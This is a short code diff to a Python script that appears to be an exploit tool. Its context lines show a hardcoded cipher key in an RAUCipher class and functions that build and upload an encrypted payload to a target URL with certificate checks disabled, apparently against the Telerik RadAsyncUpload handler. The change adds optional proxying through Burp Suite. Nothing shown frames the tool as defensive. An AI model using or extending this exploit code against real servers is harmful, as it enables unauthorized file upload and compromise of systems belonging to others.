@@ -37,6 +37,10 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
+USE_PROXY = False
+PROXY_ADDR = 'http://127.0.0.1:8080' # Burp Suite default
+
+
 class RAUCipher:
     key = binascii.unhexlify("EB8AF90FDE30FECBE330E807CF0B4252" +
                              "A44E9F06A2EA4AF10B046F598DD3EA0C")
@@ -172,6 +176,9 @@ def payload(TempTargetFolder, Version, payload_filename):
 def upload(TempTargetFolder, Version, payload_filename, url):
     sys.stderr.write("Preparing to upload to " + url + "\n")
     session = requests.Session()
+    proxies = None
+    if USE_PROXY:
+        proxies = { 'http' : PROXY_ADDR, 'https' : PROXY_ADDR }
     request = requests.Request(
                         'POST',
                         url,
@@ -185,7 +192,7 @@ def upload(TempTargetFolder, Version, payload_filename, url):
     request.headers["Content-Type"] = \
         "multipart/form-data; " +\
         "boundary=---------------------------68821516528156"
-    response = session.send(request, verify=False)
+    response = session.send(request, verify=False, proxies=proxies)
     sys.stderr.write("Upload done\n")
     return response.text
 
